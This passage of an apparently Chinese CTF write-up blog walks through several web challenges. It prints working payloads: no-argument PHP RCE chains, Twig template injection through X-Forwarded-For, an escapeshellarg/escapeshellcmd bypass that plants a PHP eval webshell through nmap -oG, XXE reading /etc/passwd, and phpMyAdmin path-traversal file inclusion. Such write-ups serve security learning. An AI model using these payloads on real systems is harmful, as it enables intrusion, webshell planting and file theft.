class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">getchwd</span><span class="hljs-params">()</span></span>：函数返回当前工作目录。<br><span class="hljs-function"><span class="hljs-title">scandir</span><span class="hljs-params">()</span></span>：函数返回指定目录中的文件和目录的数组。<br><span class="hljs-function"><span class="hljs-title">dirname</span><span class="hljs-params">()</span></span>：函数返回路径中的目录部分。<br><span class="hljs-function"><span class="hljs-title">chdir</span><span class="hljs-params">()</span></span>：函数改变当前的目录。<br><span class="hljs-function"><span class="hljs-title">readfile</span><span class="hljs-params">()</span></span>：输出一个文件。<br><span class="hljs-function"><span class="hljs-title">current</span><span class="hljs-params">()</span></span>：返回数组中的当前单元, 默认取第一个值。<br><span class="hljs-function"><span class="hljs-title">pos</span><span class="hljs-params">()</span></span>：<span class="hljs-built_in">current</span>() 的别名。<br><span class="hljs-function"><span class="hljs-title">next</span><span class="hljs-params">()</span></span>：函数将内部指针指向数组中的下一个元素，并输出。<br><span class="hljs-function"><span class="hljs-title">end</span><span class="hljs-params">()</span></span>：将内部指针指向数组中的最后一个元素，并输出。<br><span class="hljs-function"><span class="hljs-title">array_rand</span><span class="hljs-params">()</span></span>：函数返回数组中的随机键名，或者如果您规定函数返回不只一个键名，则返回包含随机键名的数组。<br><span class="hljs-function"><span class="hljs-title">array_flip</span><span class="hljs-params">()</span></span>：<span class="hljs-built_in">array_flip</span>() 函数用于反转/交换数组中所有的键名以及它们关联的键值。<br><span class="hljs-function"><span class="hljs-title">array_slice</span><span class="hljs-params">()</span></span>：函数在数组中根据条件取出一段值，并返回。<br><span class="hljs-function"><span class="hljs-title">array_reverse</span><span class="hljs-params">()</span></span>：函数返回翻转顺序的数组。<br><span class="hljs-function"><span class="hljs-title">chr</span><span class="hljs-params">()</span></span> 函数从指定的：ASCII 值返回字符。<br><span class="hljs-function"><span class="hljs-title">hex2bin</span><span class="hljs-params">()</span></span>：— 转换十六进制字符串为二进制字符串。<br><span class="hljs-function"><span class="hljs-title">getenv</span><span class="hljs-params">()</span></span>：获取一个环境变量的值(在<span class="hljs-number">7.1</span>之后可以不给予参数)。<br><span class="hljs-function"><span class="hljs-title">localeconv</span><span class="hljs-params">()</span></span>：函数返回一包含本地数字及货币格式信息的数组。<br></code></pre></td></tr></table></figure><p>payload:</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">?exp=print<span class="hljs-constructor">_r(<span class="hljs-params">scandir</span>(<span class="hljs-params">pos</span>(<span class="hljs-params">localeconv</span>()</span>)));<br></code></pre></td></tr></table></figure><p><img src="/images/Q18QQU2TN4NTI9VNSA0.png"><br><strong>代码解释：</strong><br>想要浏览目录内的所有文件需要用到函数<code>scandir()</code>。当<code>scandir()</code>传入<code>.</code>,它就可以列出当前目录的所有文件。<br>但这里是无参数的RCE，我们不能写<code>scandir(.)</code>,而<code>localeconv()</code>却会有一个返回值，那个返回值正好就是<code>.</code>,再配合<code>pos</code>或<code>current()</code>就可以把<code>.</code>取出来传给<code>scandir()</code>查看所有文件了。</p><p>现在知道了flag的位置，flag为倒数第二个，我们可以使用翻转函数<code>array_reverse()</code>，再用一个next就可以查看flag文件了，查看flag文件可用函数为<code>highlight_file(),readfile(),show_source()</code>等等。。。<br>payload:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs perl">?<span class="hljs-keyword">exp</span>=readfile(<span class="hljs-keyword">next</span>(array_reverse(scandir(<span class="hljs-keyword">pos</span>(localeconv())))));<br><span class="hljs-regexp">//</span>$flag = <span class="hljs-string">&quot;flag&#123;c4305172-c8af-4fa8-af1f-504d83d83583&#125;&quot;</span>;<br></code></pre></td></tr></table></figure><p>虽然本题的flag位置不是那么特殊，但总会遇到特殊位置flag的题，可以用<code>array_rand()</code>和<code>array_flip()</code><br>(<code>array_rand()</code>返回的是键名所以必须搭配<code>array_flip()</code>来交换键名、键值来获得键值，随机刷新显示的内容)<br>payload:</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">?exp=show<span class="hljs-constructor">_source(<span class="hljs-params">array_rand</span>(<span class="hljs-params">array_flip</span>(<span class="hljs-params">scandir</span>(<span class="hljs-params">pos</span>(<span class="hljs-params">localeconv</span>()</span>)))));<br></code></pre></td></tr></table></figure><p><strong>方法二：session_id()</strong><br>上面的正则过滤中并没有过滤session，所以我们可以用session_id来获取flag<br><code>session_id()</code><br>可以用来获取&#x2F;设置当前会话id。<br>php是默认不主动使用session的<br>在我们使用session_id()的时候 需要使用<code>session_start()</code>来开启session会话<br>PHPSESSID本身是可以直接加上例如flag.php这类的字符的<br>payload:</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">exp</span>=show_source(session_id(session_start()));<br>COOKIE:<br><span class="hljs-attribute">PHPSESSID</span>=flag.php<br></code></pre></td></tr></table></figure><p><a href="https://blog.csdn.net/Manuffer/article/details/120738755">无参RCE传送门</a><br>写的非常好，收获颇丰🤤</p><h2 id="BJDCTF2020-The-mystery-of-ip"><a href="#BJDCTF2020-The-mystery-of-ip" class="headerlink" title="[BJDCTF2020]The mystery of ip"></a>[BJDCTF2020]The mystery of ip</h2><p>启动环境<br>flag.txt<br><img src="/images/RDZVO40JRJ84SIYW.png"><br>hint.php中查看源码的注释作者也说了Do you know why i know your ip?<br>结合题目与作者的hint，猜测本题x-forwarded-for处有问题<br>burpsuite抓抓<br><img src="/images/5ENMQE2LCM1KOF03JQ8.png"><br>成功执行，说明XFF可控<br>控制XFF进行命令执行（这是要在前端有IP相关回显的情况）<br>查阅资料<br>Flask可能存在Jinjia2模版注入漏洞<br>PHP可能存在Twig模版注入漏洞<br>试试能否执行模板算式</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">x-forwarded-for:</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">7</span>*<span class="hljs-number">7</span>&#125;&#125;</span><br></code></pre></td></tr></table></figure><p><img src="/images/LJ7EPLUC0WFRYGH.png"><br>成功执行，尝试是否能执行命令</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">x-forwarded-for:</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">system</span>(<span class="hljs-name">&#x27;ls&#x27;</span>)&#125;&#125;</span><br></code></pre></td></tr></table></figure><p><img src="/images/12M2VGZKUFL40.png"><br>无脑RCE<br><a href="https://www.cnblogs.com/zzjdbk/p/13049923.html">模板注入检测</a></p><h2 id="BUUCTF-2018-Online-Tool"><a href="#BUUCTF-2018-Online-Tool" class="headerlink" title="[BUUCTF 2018]Online Tool"></a>[BUUCTF 2018]Online Tool</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>] = <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>];<br>&#125;<br><br><span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;host&#x27;</span>])) &#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-variable">$host</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;host&#x27;</span>];<br>    <span class="hljs-variable">$host</span> = <span class="hljs-title function_ invoke__">escapeshellarg</span>(<span class="hljs-variable">$host</span>);<br>    <span class="hljs-variable">$host</span> = <span class="hljs-title function_ invoke__">escapeshellcmd</span>(<span class="hljs-variable">$host</span>);<br>    <span class="hljs-variable">$sandbox</span> = <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-string">&quot;glzjin&quot;</span>. <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>]);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;you are in sandbox &#x27;</span>.<span class="hljs-variable">$sandbox</span>;<br>    @<span class="hljs-title function_ invoke__">mkdir</span>(<span class="hljs-variable">$sandbox</span>);<span class="hljs-comment">//创建目录</span><br>    <span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-variable">$sandbox</span>);<span class="hljs-comment">//改变当前的目录</span><br>    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;nmap -T5 -sT -Pn --host-timeout 2 -F &quot;</span>.<span class="hljs-variable">$host</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>HTTP_X_FORWARDED_FOR HTTP扩展头部，用来表示http请求端真实ip</p><p>REMOTE_ADDR代表客户端的IP，但它的值不是由客户端提供的，而是服务端根据客户端的ip指定的，当你的浏览器访问某个网站时，假设中间没有任何代理，那么网站的web服务器（Nginx，Apache等）就会把remote_addr设为你的机器IP，如果你用了某个代理，那么你的浏览器会先访问这个代理，然后再由这个代理转发到网站，这样web服务器就会把remote_addr设为这台代理机器的IP。</p><p>本题主要考察的是escapeshellarg和escapeshellcmd这两个函数</p><ul><li>escapeshellarg：对传入的字符串用一对单引号包围，将内容的’先用反斜杠转义，再添加一对单引号包围，即单引号会被转义为’&#39;‘</li><li>escapeshellcmd：对\以及最后那个不配对儿的引号进行转义</li></ul><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs routeros">传入的参数是172.17.0.2<span class="hljs-string">&#x27; -v -d a=1</span><br><span class="hljs-string">经过escapeshellarg处理后变成了&#x27;</span>172.17.0.2<span class="hljs-string">&#x27;\&#x27;</span><span class="hljs-string">&#x27; -v -d a=1&#x27;</span>，即先对单引号转义，再用单引号将左右两部分括起来从而起到连接的作用。<br>经过escapeshellcmd处理后变成<span class="hljs-string">&#x27;172.17.0.2&#x27;</span>\\<span class="hljs-string">&#x27;&#x27;</span> -v -d <span class="hljs-attribute">a</span>=1\&#x27;，这是因为escapeshellcmd对\以及最后那个不配对儿的引号进行了转义：<br>最后执行的命令是curl <span class="hljs-string">&#x27;172.17.0.2&#x27;</span>\\<span class="hljs-string">&#x27;&#x27;</span> -v -d <span class="hljs-attribute">a</span>=1\&#x27;，由于中间的\\被解释为\而不再是转义字符，所以后面的&#x27;没有被转义，与再后面的&#x27;配对成了一个空白连接符。所以可以简化为curl 172.17.0.2\ -v -d <span class="hljs-attribute">a</span>=1&#x27;,即向172.17.0.2\发起请求，POST数据为a=1&#x27;。<br></code></pre></td></tr></table></figure><p>两次转义后出现了问题，没有考虑到单引号的问题<br>再往下看，看到echo system(“nmap -T5 -sT -Pn –host-timeout 2 -F “.$host);<br>这里有个system来执行命令，而且有传参，肯定是利用这里了</p><p>这里代码的本意是希望我们输入ip这样的参数做一个扫描，通过上面的两个函数来进行规则过滤转义，我们的输入会被单引号引起来，但是因为我们看到了上面的漏洞所以我们可以逃脱这个引号的束缚</p><p>在nmap命令中，有一个参数-oG可以实现将命令和结果写到文件，这个命令就是我们的输入可控，然后写入到文件，传入一句话木马<br>注意引号加空格，不加空格会将语句转义。</p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">?host=&#x27; </span><span class="language-php"><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;a&quot;</span>]);<span class="hljs-meta">?&gt;</span></span><span class="language-xml"> -oG 1.php &#x27;</span><br></code></pre></td></tr></table></figure><p>进入MD5目录下的1.php<br><img src="/images/S3IOWE9SGW1BLCJK5.png"><br>开始RCE</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs clean">POST:<br>a=<span class="hljs-keyword">system</span>(<span class="hljs-string">&#x27;ls&#x27;</span>);<br>a=<span class="hljs-keyword">system</span>(<span class="hljs-string">&#x27;ls /&#x27;</span>);<br>a=<span class="hljs-keyword">system</span>(<span class="hljs-string">&#x27;cat /flag&#x27;</span>);<br></code></pre></td></tr></table></figure><p>这里有两个小问题</p><p>首先是后面没有加引号</p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">?host=&#x27; </span><span class="language-php"><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;a&quot;</span>]);<span class="hljs-meta">?&gt;</span></span><span class="language-xml"> -oG 1.php</span><br></code></pre></td></tr></table></figure><p>先经过escapeshellarg()函数处理，该函数会先对单引号转义，再用单引号将左右两部分括起来从而起到连接的作用。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">?host=<span class="hljs-string">&#x27;&#x27;</span>\<span class="hljs-string">&#x27;&#x27;</span> <span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;a&quot;</span>]);<span class="hljs-meta">?&gt;</span> -oG <span class="hljs-number">1</span>.php<span class="hljs-string">&#x27;</span><br></code></pre></td></tr></table></figure><p>再经过escapeshellcmd()函数处理，escapeshellcmd对\以及最后那个不配对儿的引号进行了转义，转义命令中的所有shell元字符来完成工作。这些元字符包括：<code>#&amp;;`,|*?~&lt;&gt;^()[]&#123;&#125;$\\。</code></p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-string">?h</span>ost=<span class="hljs-string">&#x27;&#x27;</span>\<span class="hljs-string">&#x27;&#x27;</span> \&lt;\<span class="hljs-string">?p</span>hp <span class="hljs-variable">@eval</span>\(<span class="hljs-variable">$_POST</span>\[<span class="hljs-string">&quot;a&quot;</span>\]\)\;\<span class="hljs-string">?\&gt;</span> -oG <span class="hljs-number">1</span>.php\<span class="hljs-string">&#x27;</span><br></code></pre></td></tr></table></figure><p>返回结果是上面那样文件名后面会多一个引号1.php’</p><p>第二个是加引号但引号前没有空格</p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">?host=&#x27; </span><span class="language-php"><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;a&quot;</span>]);<span class="hljs-meta">?&gt;</span></span><span class="language-xml"> -oG 1.php&#x27;</span><br></code></pre></td></tr></table></figure><p>运行结果如下</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-string">&#x27;&#x27;</span>\\<span class="hljs-string">&#x27;&#x27;</span> \&lt;\<span class="hljs-string">?p</span>hp <span class="hljs-variable">@eval</span>\(<span class="hljs-variable">$_POST</span>\[<span class="hljs-string">&quot;a&quot;</span>\]\)\;\<span class="hljs-string">?\&gt;</span> -oG <span class="hljs-number">1</span>.php<span class="hljs-string">&#x27;\\&#x27;</span><span class="hljs-string">&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><p>文件名后面就会多出<code>\\</code> <code>1.php\\</code><br><a href="https://paper.seebug.org/164/">PHP escapeshellarg()+escapeshellcmd() 之殇</a></p><h2 id="NCTF2019-Fake-XML-cookbook"><a href="#NCTF2019-Fake-XML-cookbook" class="headerlink" title="[NCTF2019]Fake XML cookbook"></a>[NCTF2019]Fake XML cookbook</h2><p>先尝试sql注入，行不通<br>看看源码<br><img src="/images/VSCRU5OH75NYS3N.png"><br>找到一个php文件<br>还有<br><code>contentType: &quot;application/xml;charset=utf-8&quot;,</code><br>进入doLogin.php<br><img src="/images/NY0S07MJ2GOIRTM3AJF.png"><br>发现都指向xml<br>那么xml有个xxe漏洞，抓包看能否利用一下，构建一个恶意的外部实体<br>payload</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;utf-8&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE a [</span><br><span class="hljs-meta">  <span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">admin</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///etc/passwd&quot;</span>&gt;</span></span><br><span class="hljs-meta">]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">user</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">username</span>&gt;</span><span class="hljs-symbol">&amp;admin;</span><span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">password</span>&gt;</span>123456<span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">user</span>&gt;</span><br></code></pre></td></tr></table></figure><p><img src="/images/CK8BJG03EQERY8O69T0.png"><br>可行，看能不能直接读取flag<br>payload</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;utf-8&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE a [</span><br><span class="hljs-meta">  <span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">admin</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///flag&quot;</span>&gt;</span></span><br><span class="hljs-meta">]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">user</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">username</span>&gt;</span><span class="hljs-symbol">&amp;admin;</span><span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">password</span>&gt;</span>123456<span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">user</span>&gt;</span><br></code></pre></td></tr></table></figure><p><img src="/images/MLC6SAFLMOJVT39WPR.png"><br>传送门&#x3D;&#x3D;&#x3D;&gt;<a href="https://www.freebuf.com/vuls/175451.html">浅谈XML实体注入漏洞</a></p><h2 id="GWCTF-2019-我有一个数据库"><a href="#GWCTF-2019-我有一个数据库" class="headerlink" title="[GWCTF 2019]我有一个数据库"></a>[GWCTF 2019]我有一个数据库</h2><p><img src="/images/JMFRP9VYT5A0VKQDORT.png"><br>整了个这么个界面，有点迷糊，抓包源码都没获得有效的信息<br>用dirsearch扫扫，扫到了robots.txt，里面提示了个phpinfo.php，还是没有找到有效的信息<br>再往后继续扫到了phpmyadmin，进入查看，数据库里一大堆内容根本懒得看<br><img src="/images/XXQ3LARFHLVNSZQEEQW.png"><br>查阅到4.8.0 &lt;&#x3D; phpMyAdmin &lt; 4.8.2版本的phpmyadmin都是有文件包含漏洞<br><a href="https://blog.csdn.net/weixin_44037296/article/details/111039461">漏洞复现</a><br>例如传入</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">?<span class="hljs-keyword">target</span><span class="hljs-operator">=</span>db_datadict.php<span class="hljs-variable">%253</span>f<br></code></pre></td></tr></table></figure><p>由于服务器会自动解码一次，所以在checkPageValidity()中，$page的值一开始会是db_datadict.php%3f,又一次url解码后变成了db_datadict.php?,这便符合了?前内容在白名单的要求，函数返回true但在index.php中$_REQUEST[‘target’]仍然是db_datadict.php%3f,而且会被include，通过目录穿越，就可造成任意文件包含</p><p>漏洞原理是：<br>利用&#x2F;使db_datadict.php?成为一个不存在目录，利用include函数的目录不断跳转尝试得到flag目录。</p><figure class="highlight haml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs haml"><span class="hljs-tag">%<span class="hljs-selector-tag">25</span></span>的url编码为%<br><span class="hljs-tag">%<span class="hljs-selector-tag">3f</span></span>的url编码为?<br><span class="hljs-tag">%<span class="hljs-selector-tag">253f</span></span>--&gt;?<br></code></pre></td></tr></table></figure><p>payload</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">?target=db_sql.php%<span class="hljs-number">253</span>f<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/etc/</span>passwd<br></code></pre></td></tr></table></figure><p><img src="/images/G1EYMWNMMY6OS2BF0.png"><br>可以成功执行，获取到了passwd文件的内容，尝试查找flag<br>payload</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">?target=db_sql.php%<span class="hljs-number">253</span>f<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>../flag<br></code></pre></td></tr></table></figure><p><img src="/images/XZ69C0YPOUN95B37GM.png"></p><h2 id="BJDCTF2020-Mark-loves-cat"><a href="#BJDCTF2020-Mark-loves-cat" class="headerlink" title="[BJDCTF2020]Mark loves cat"></a>[BJDCTF2020]Mark loves cat</h2><p>查看源码以及抓包，没有找到有用的信息<br>尝试dirsearch扫描，发现存在.git泄露<br>那么直接用git_hack扫出文件<br>在index.php文件中找出php源码</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs awk">&lt;?php<br><br><span class="hljs-regexp">/*include &#x27;flag.php&#x27;;*/</span><br>highlight_file(__FILE__);<br><span class="hljs-variable">$yds</span> = <span class="hljs-string">&quot;dog&quot;</span>;<br><span class="hljs-variable">$is</span> = <span class="hljs-string">&quot;cat&quot;</span>;<br><span class="hljs-variable">$handsome</span> = <span class="hljs-string">&#x27;yds&#x27;</span>;<br><br>foreach(<span class="hljs-variable">$_POST</span> as <span class="hljs-variable">$x</span> =&gt; <span class="hljs-variable">$y</span>)&#123;<br>    $<span class="hljs-variable">$x</span> = <span class="hljs-variable">$y</span>;<br>&#125;<br><br>foreach(<span class="hljs-variable">$_GET</span> as <span class="hljs-variable">$x</span> =&gt; <span class="hljs-variable">$y</span>)&#123;<br>    $<span class="hljs-variable">$x</span> = $<span class="hljs-variable">$y</span>;<br>&#125;<br><br>foreach(<span class="hljs-variable">$_GET</span> as <span class="hljs-variable">$x</span> =&gt; <span class="hljs-variable">$y</span>)&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;flag&#x27;</span>] === <span class="hljs-variable">$x</span> &amp;&amp; <span class="hljs-variable">$x</span> !== <span class="hljs-string">&#x27;flag&#x27;</span>)&#123;<br>        <span class="hljs-keyword">exit</span>(<span class="hljs-variable">$handsome</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span>(!isset(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;flag&#x27;</span>]) &amp;&amp; !isset(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;flag&#x27;</span>]))&#123;<br>    <span class="hljs-keyword">exit</span>(<span class="hljs-variable">$yds</span>);<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;flag&#x27;</span>] === <span class="hljs-string">&#x27;flag&#x27;</span>  || <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;flag&#x27;</span>] === <span class="hljs-string">&#x27;flag&#x27;</span>)&#123;<br>    <span class="hljs-keyword">exit</span>(<span class="hljs-variable">$is</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>exit和die一样，都是输出一条信息后退出当前脚本<br>上面的代码中最重要的两块代码</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs awk">foreach(<span class="hljs-variable">$_GET</span> as <span class="hljs-variable">$x</span> =&gt; <span class="hljs-variable">$y</span>)&#123;<br>    $<span class="hljs-variable">$x</span> = $<span class="hljs-variable">$y</span>;<br>&#125;<br><br>foreach(<span class="hljs-variable">$_GET</span> as <span class="hljs-variable">$x</span> =&gt; <span class="hljs-variable">$y</span>)&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;flag&#x27;</span>] === <span class="hljs-variable">$x</span> &amp;&amp; <span class="hljs-variable">$x</span> !== <span class="hljs-string">&#x27;flag&#x27;</span>)&#123;<br>        <span class="hljs-keyword">exit</span>(<span class="hljs-variable">$handsome</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>利用一下,先解释一下可变变量：<br>如果一个变量保存的值刚好是另外一个变量的名字，那么可以直接通过访问一个变量得到另外一个变量的值：在变量之前再多加一个$符号<br>例：</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-meta"><span class="hljs-keyword">$a</span>=&#x27;b&#x27;;</span><br><span class="hljs-meta"><span class="hljs-keyword">$b</span>=&#x27;bbbb&#x27;;</span><br>echo <span class="hljs-symbol">$</span><span class="hljs-symbol">$</span>a;<br><span class="hljs-comment">//输出bbbb </span><br><span class="hljs-symbol">$</span><span class="hljs-symbol">$</span>a-&gt;<span class="hljs-symbol">$</span>b<br></code></pre></td></tr></table></figure><p>简单理解为$$a相当于$($a)<br>再对上面的代码进行解读</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$_GET</span> as <span class="hljs-variable">$x</span> =&gt; <span class="hljs-variable">$y</span>)&#123;<br>    <span class="hljs-variable">$</span><span class="hljs-variable">$x</span> = <span class="hljs-variable">$</span><span class="hljs-variable">$y</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>比如GET输入a&#x3D;flag<br>那么$x&#x3D;a,$y&#x3D;flag<br> $$x &#x3D; $$y所以$a&#x3D;$flag,配合exit这样就可以输入$flag的值了<br> 构造payload<br> <figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sqf">?handsome=<span class="hljs-built_in">flag</span>&amp;x=<span class="hljs-built_in">flag</span>&amp;<span class="hljs-built_in">flag</span>=x<br></code></pre></td></tr></table></figure><br>handsome&#x3D;flag不用说 就是让$handsome&#x3D;$flag<br>后面的目的就是让我们传入的变量是 flag 值不是flag 进而能够exit handsome<br>这里的值表面是 x 但前面我们进行了变量覆盖使得 x&#x3D;flag 所以在这里我们输出x的值就是flag的值<br><img src="/images/JNSYNMWR0M0GM7R.png"></p><h2 id="WUSTCTF2020-朴实无华"><a 